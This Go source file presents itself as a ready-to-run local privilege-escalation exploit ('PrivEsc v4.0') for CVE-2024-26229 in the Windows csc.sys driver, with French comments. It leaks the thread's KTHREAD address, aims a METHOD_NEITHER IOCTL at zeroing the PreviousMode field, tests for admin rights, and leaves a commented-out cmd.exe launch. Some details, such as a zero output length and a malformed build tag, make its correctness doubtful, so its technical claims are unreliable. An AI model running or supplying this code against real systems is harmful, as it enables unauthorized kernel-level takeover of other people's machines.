package main

import (
	"fmt"
	"os"
	"os/user"
	"syscall"
	"unsafe"
)

// go:build windows

// --- CONSTANTES ET STRUCTURES WINDOWS ---
const (
	SystemExtendedHandleInformation = 0x40
	// IOCTL pour CSC.sys (CVE-2024-26229)
	// Ce code cible la fonction CscUserQueryDatabase qui a une vulnérabilité METHOD_NEITHER
	IOCTL_CSC_USER_QUERY_DATABASE = 0x225890
)

type SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX struct {
	Object                uintptr
	UniqueProcessId       uintptr
	HandleValue           uintptr
	GrantedAccess         uint32
	CreatorBackTraceIndex uint16
	ObjectTypeIndex       uint16
	HandleAttributes      uint32
	Reserved              uint32
}

type SYSTEM_HANDLE_INFORMATION_EX struct {
	NumberOfHandles uintptr
	Reserved        uintptr
	Handles         [1]SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
}

var (
	ntdll    = syscall.NewLazyDLL("ntdll.dll")
	kernel32 = syscall.NewLazyDLL("kernel32.dll")

	procNtQuerySystemInformation = ntdll.NewProc("NtQuerySystemInformation")
	procGetCurrentProcessId      = kernel32.NewProc("GetCurrentProcessId")
	procGetCurrentThreadId       = kernel32.NewProc("GetCurrentThreadId")
	procDeviceIoControl          = kernel32.NewProc("DeviceIoControl")
	procCreateFile               = kernel32.NewProc("CreateFileW")
)

// GetCurrentThreadKThreadAddress récupère l'adresse du KTHREAD actuel
func GetCurrentThreadKThreadAddress() (uintptr, error) {
	var returnLength uint32
	pid, _, _ := procGetCurrentProcessId.Call()
	tid, _, _ := procGetCurrentThreadId.Call()

	// STATUS_INFO_LENGTH_MISMATCH (0xC0000004)
	const STATUS_INFO_LENGTH_MISMATCH = 0xC0000004

	// On commence avec un buffer de 1 Mo, c'est souvent suffisant
	bufferSize := uint32(0x100000)
	var buffer []byte
	var ret uintptr

	// Boucle pour ajuster la taille du buffer dynamiquement
	for {
		buffer = make([]byte, bufferSize)
		ret, _, _ = procNtQuerySystemInformation.Call(
			uintptr(SystemExtendedHandleInformation),
			uintptr(unsafe.Pointer(&buffer[0])),
			uintptr(bufferSize),
			uintptr(unsafe.Pointer(&returnLength)),
		)

		if ret == 0 {
			break // Succès !
		}

		if uint32(ret) != STATUS_INFO_LENGTH_MISMATCH {
			return 0, fmt.Errorf("NtQuerySystemInformation failure: 0x%x", ret)
		}

		// Si on a manqué de place, on prend la taille suggérée + un extra de sécurité
		bufferSize = returnLength + 0x10000
	}

	info := (*SYSTEM_HANDLE_INFORMATION_EX)(unsafe.Pointer(&buffer[0]))
	handleCount := int(info.NumberOfHandles)

	// Utilisation de unsafe.Pointer pour parcourir les structures
	startOfHandles := uintptr(unsafe.Pointer(&info.Handles[0]))
	handleSize := unsafe.Sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX{})

	for i := 0; i < handleCount; i++ {
		handle := (*SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)(unsafe.Pointer(startOfHandles + uintptr(i)*handleSize))

		if handle.UniqueProcessId == pid && handle.HandleValue == tid {
			return handle.Object, nil
		}
	}

	return 0, fmt.Errorf("thread handle not found in kernel table")
}

// ExploitCSCSys réalise l'élévation via CVE-2024-26229
func ExploitCSCSys() bool {
	fmt.Println("[*] Tentative d'exploitation CSC.sys (CVE-2024-26229) sur Windows 11 23H2...")

	// 1. Leak de l'adresse KTHREAD
	kThreadAddr, err := GetCurrentThreadKThreadAddress()
	if err != nil {
		fmt.Printf("[!] Erreur Leak: %v\n", err)
		return false
	}
	fmt.Printf("[+] KTHREAD leaked at: 0x%x\n", kThreadAddr)

	// 2. Cible (PreviousMode) - Offset 0x232 reste valide sur la plupart des builds 23H2
	targetAddr := kThreadAddr + 0x232
	fmt.Printf("[*] Ciblage de PreviousMode à : 0x%x\n", targetAddr)

	// 3. Ouverture du device CSC
	devName, _ := syscall.UTF16PtrFromString("\\\\.\\Csc")
	handle, _, _ := procCreateFile.Call(
		uintptr(unsafe.Pointer(devName)),
		syscall.GENERIC_READ|syscall.GENERIC_WRITE,
		0,
		0,
		syscall.OPEN_EXISTING,
		0,
		0,
	)

	if handle == uintptr(syscall.InvalidHandle) {
		fmt.Println("[-] Impossible d'ouvrir \\\\.\\Csc (Le service Offline Files est-il actif ?)")
		return false
	}
	defer syscall.CloseHandle(syscall.Handle(handle))

	// 4. Déclenchement de la corruption (Primitive Write-0)
	// La vulnérabilité METHOD_NEITHER permet d'utiliser le pointeur PreviousMode
	// comme buffer de sortie pour mettre sa valeur à zero.
	var dummy uint32

	// On passe targetAddr comme OutputBuffer pour écraser le PreviousMode (0x00)
	ret, _, _ := procDeviceIoControl.Call(
		handle,
		uintptr(IOCTL_CSC_USER_QUERY_DATABASE),
		0, 0, // Pas d'InputBuffer nécessaire pour déclencher le bug de base
		targetAddr, 0, // On utilise targetAddr en Output pour le bug Native
		uintptr(unsafe.Pointer(&dummy)),
		0,
	)

	if ret == 0 {
		fmt.Println("[-] L'IOCTL a échoué. La machine est probablement patchée.")
		return false
	}

	fmt.Println("[+] Trigger envoyé. Vérification des droits...")
	return CheckAdmin()
}

func CheckAdmin() bool {
	f, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		return false
	}
	f.Close()
	return true
}

func main() {
	u, _ := user.Current()
	fmt.Printf("[*] PrivEsc v4.0 (CSC.sys / Win11 23H2) pour %s\n", u.Username)

	if CheckAdmin() {
		fmt.Println("[+] Déjà Administrateur.")
		return
	}

	if ExploitCSCSys() {
		fmt.Println("[+] SUCCÈS : Privilèges SYSTEM acquis !")
		// Possibilité de lancer un shell ici
		// syscall.StartProcess("C:\\Windows\\System32\\cmd.exe", nil, nil)
	} else {
		fmt.Println("[-] Échec de l'élévation sur cette build.")
	}
}
